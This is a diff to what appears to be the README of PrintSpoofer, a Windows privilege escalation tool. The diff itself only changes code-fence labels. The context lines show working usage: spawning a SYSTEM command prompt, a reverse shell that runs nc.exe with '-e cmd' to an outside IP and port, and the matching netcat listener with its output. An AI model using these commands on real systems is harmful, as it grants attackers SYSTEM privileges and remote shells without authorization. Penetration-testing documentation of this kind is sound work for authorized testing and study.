@@ -41,7 +41,7 @@ If you have an __interactive__ shell, you can create a new SYSTEM process in you
 
 __Use case__: bind shell, reverse shell, `psexec.py`, etc.
 
-```txt
+```cmd
 C:\TOOLS>PrintSpoofer.exe -i -c cmd
 [+] Found privilege: SeImpersonatePrivilege
 [+] Named pipe listening...
@@ -61,7 +61,7 @@ __Use case__: WinRM, WebShell, `wmiexec.py`, `smbexec.py`, etc.
 
 Create a reverse shell:
 
-```txt
+```cmd
 C:\TOOLS>PrintSpoofer.exe -c "C:\TOOLS\nc.exe 10.10.13.37 1337 -e cmd"
 [+] Found privilege: SeImpersonatePrivilege
 [+] Named pipe listening...
@@ -70,7 +70,7 @@ C:\TOOLS>PrintSpoofer.exe -c "C:\TOOLS\nc.exe 10.10.13.37 1337 -e cmd"
 
 Netcat listener:
 
-```txt
+```cmd
 C:\TOOLS>nc.exe -l -p 1337
 Microsoft Windows [Version 10.0.19613.1000]
 (c) 2020 Microsoft Corporation. All rights reserved.
@@ -85,7 +85,7 @@ If you are __logged on locally or via RDP__ (including VDI), you can spawn a SYS
 
 __Use case__: Terminal Session (RDP), VDI
 
-```txt
+```cmd
 C:\TOOLS>qwinsta
  SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
  services                                    0  Disc
